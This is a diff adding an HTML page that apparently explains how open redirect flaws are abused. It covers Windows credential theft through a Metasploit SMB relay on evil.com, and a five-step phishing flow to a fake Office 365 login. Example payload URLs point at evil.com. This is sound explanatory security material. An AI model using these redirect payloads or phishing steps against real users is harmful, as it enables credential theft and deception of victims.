@@ -1,0 +1,24 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Credential Stealing</title>
+</head><body><b>Windows credential stealing (ie only)</b><br/>
+An attacker could exploit an open redirect by combining Metasploit SMB relay and the open redirect flaw. The attacker would set up exploits/windows/smb/smb_relay on evil.com and redirect to \\evil.com\c$. When the redirect occurs, the victim will to try to open a network share and thus send over their windows credentials. This attack only works on victims that is using Internet Explorer.<br/>
+<br/>
+Example: https://example.com/?u=\\evil.com\c$<br/>
+<br/>
+<br/>
+<b>Phishing redirect</b><br/>
+When a user clicks a link in an email, they are taught to first hover the link and read where it goes. If the link points to a website they trust, it is very likely that they will follow the link. Only a really trained eye would react due to a redirection after clicking a trusted link. In fact, redirects are actually very common the case of authentication.<br/>
+<br/>
+This type of attack that you should be worried about that I mentioned in the introduction. An attack that is almost 100% success that we commonly use looks similarily to this:<br/>
+1. The victim gets an email saying "Alice shared a document with you"<br/>
+2. The email contains a link to office365.com.<br/>
+3. The victim clicks the link and gets redirected to office365.secure.evil.com. Note that the user is used to being redirected when authenticating due to Single-sign on features.<br/>
+4. The victim fails to verify the final url and leaks his credentials.<br/>
+5. The victim is then redirected to the real logon portal where they [presumibly] successfully log in.<br/>
+<br/>
+It is not only hard to detect the attack for the victim, but in many cases also for the blue team who tries to find the phishing email / patient zero from the bigger picture.<br/>
+<br/>
+Example: https://example.com/?u=https://evil.com/login</body></html>
